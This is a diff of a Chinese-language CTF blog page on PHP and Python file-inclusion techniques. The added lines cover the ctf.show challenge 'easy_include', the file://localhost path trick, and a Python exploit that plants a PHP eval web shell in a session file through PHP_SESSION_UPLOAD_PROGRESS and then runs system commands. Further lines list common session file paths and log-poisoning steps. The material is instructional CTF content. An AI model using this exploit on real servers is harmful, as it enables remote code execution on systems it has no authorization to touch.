@@ -27,7 +27,7 @@
 <meta property="og:description" content="在python服务器上运行这种情况下网页由python(flask)写成，可以利用文件包含漏洞查看源码，首先需要知道源码文件名（一般情况下是app.py），可以通过包含根目录下&#96;proc&#x2F;self&#x2F;cmdline&#96;，查看启动当前进程的命令，得到源码文件名，再进行包含。  当要求包含的文件名中必须有特定字符像这样 123if( strpos( $file, &quot;woofers&quot; )">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-01-20T13:06:41.000Z">
-<meta property="article:modified_time" content="2025-03-08T06:34:09.338Z">
+<meta property="article:modified_time" content="2025-03-15T04:27:22.110Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -233,7 +233,7 @@
         
         
         
-          25 分钟
+          26 分钟
         
       </span>
     
@@ -298,12 +298,15 @@ payload = ?catogory=php://filter/read=convert.base64-encode/resource=woofers/../
 <p>需要绝对路径,日志文件名,位置可知.</p>
 <p>首先获取服务器根目录，<br>包含<code>/proc/8/cmdline</code>获得<code>WorkerMan: master process start_file=/var/www/html/webrooth1xaa/start.php</code>,结合本地的start.php位置可知,根目录为&#x2F;var&#x2F;www&#x2F;html&#x2F;webrooth1xaa</p>
 <p>包含<code>&lt;?php ... ?&gt;</code>,将产生<code>include &lt;?php ... ?&gt;</code>错误,写入日志文件中,再包含日志文件</p>
-<h3 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h3><p>exp：</p>
+<h3 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h3><p>题目<a target="_blank" rel="noopener" href="https://ctf.show/challenges#easy_include-4260">easy_include</a></p>
+<p>考点一:<br>file伪协议除了通过<code>file:///&lt;PATH&gt;</code>访问，也可以通过<code>file://localhost/&lt;PATH&gt;</code>访问<br>理论上可以通过<code>file://&lt;IP&gt;/&lt;PATH&gt;</code>访问, 但可能实际上不被允许, 只有<code>file://127.0.0.1/&lt;PATH&gt;</code>可行</p>
+<p>考点二:<br>文件包含</p>
+<p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span>: <span class="hljs-string">&#x27;localhost/tmp/sess_aaa&#x27;</span>, <span class="hljs-comment"># include file://localhost/tmp/sess_aaa</span><br>    <span class="hljs-string">&#x27;cmd&#x27;</span>: <span class="hljs-string">&#x27;system(&quot;ls /&quot;);&#x27;</span> <br>&#125;<br>file = &#123;<br>    <span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-string">&#x27;fakeFile&#x27;</span><br>&#125;<br>cookies = &#123;<br>    <span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: <span class="hljs-string">&#x27;aaa&#x27;</span><br>&#125;<br>response = requests.post(url=url, data=data, files=file, cookies=cookies)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>
 <p>最终session文件中内容为 <code>...upload_progress_&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;...</code></p>
 <p>配置要求：<br><strong>session.upload_progress.enabled &#x3D; on</strong><br><strong>session.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS”</strong> (默认值)<br>session.use_strict_mode &#x3D; 0 (默认值)  || session.auto_start &#x3D; 1 (非默认值) || 代码中执行session_start() || 都不满足好像也可以。。。<br>session.upload_progress.cleanup &#x3D; off (默认开启，否则需要进行条件竞争)<br>session.upload_progress.prefix &#x3D; “upload_progress_” (不重要)</p>
 <p>原理：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/288430.html">文章 :)</a></p>
-<p>当session.use_strict_mode &#x3D; 0时可以手动设置Cookie中的PHPSESSID，从而达到自定义文件名的效果, 此时必须手动设置PHPSESSID，否则不会生成session文件<br>当session.use_strict_mode &#x3D; 1时，依赖与服务器自动创建session文件(上传文件时)，在手动随机设置PHPSESSID后，响应中会返回PHPSESSID的值<br>当上传一个文件时，若session.upload_progress.enabled &#x3D; on 指示跟踪文件上传过程信息，session.upload_progress.name<br>指示从哪个(POST)变量中获取并写入信息，session.upload_progress.prefix指示写入的信息的前缀</p>
+<p>当session.use_strict_mode &#x3D; 0时可以手动设置Cookie中的PHPSESSID，从而达到自定义文件名的效果, 此时必须手动设置PHPSESSID，否则不会生成session文件<br>当session.use_strict_mode &#x3D; 1时，依赖与服务器自动创建session文件(上传文件时)，在手动随机设置PHPSESSID后，响应中会返回PHPSESSID的值<br>当上传一个文件时，若session.upload_progress.enabled &#x3D; on 指示跟踪文件上传过程信息，session.upload_progress.name指示从哪个(POST)变量中获取并写入信息，session.upload_progress.prefix指示写入的信息的前缀</p>
 <p>如果session.use_strict_mode &#x3D; 0 &amp;&amp; session.upload_progress.cleanup &#x3D; on时，需要从响应中获取PHPSESSID，但是等你获取到了PHPSESSID，session文件已经被清空了，这时就不能成功包含session文件</p>
 <p><strong>session文件路径</strong><br>常见路径：<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID<br>配置：<br>session.save_path</p>
 
@@ -389,9 +392,9 @@ payload = ?catogory=php://filter/read=convert.base64-encode/resource=woofers/../
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blogs/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="php反序列化">
+                      <a href="/blogs/php/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">php反序列化</span>
+                        <span class="hidden-mobile">php伪协议</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
